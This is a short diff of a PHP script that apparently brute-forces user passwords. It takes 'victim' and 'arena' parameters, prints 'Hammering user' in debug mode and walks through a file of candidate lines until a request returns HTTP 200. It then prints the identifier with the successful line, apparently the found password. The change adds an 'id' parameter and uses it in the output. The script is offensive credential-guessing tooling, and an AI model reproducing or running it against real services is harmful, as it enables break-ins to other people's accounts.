@@ -1,6 +1,8 @@
 <?php
 $arena = $_GET['arena'];//anvil
 $victim = $_GET['victim'];//billet
+$id = $_GET['id'];//billet
+// die( $victim."###TIME");
 //echo ;
 require_once 'vendor/autoload.php';
 if (!empty($_GET['debug'])) echo "Hammering user ".$victim."@".$arena."<br/>";
@@ -17,14 +19,16 @@ if ($handle) {
       if ($client->getResponseCode()==200) 
 {
          fclose($handle);
-         die( $victim."###".$line);
+//         die( $victim."###".$line);
+         die( $id."###".$line);
 }
     }
     fclose($handle);
 } else {
 } }
 
-echo "DONE.";
+//echo $victim."###DONE";
+echo $id."###DONE";
 
 
 } catch (Exception $e) {    echo 'Exception: ',  $e->getMessage(), "\n";}
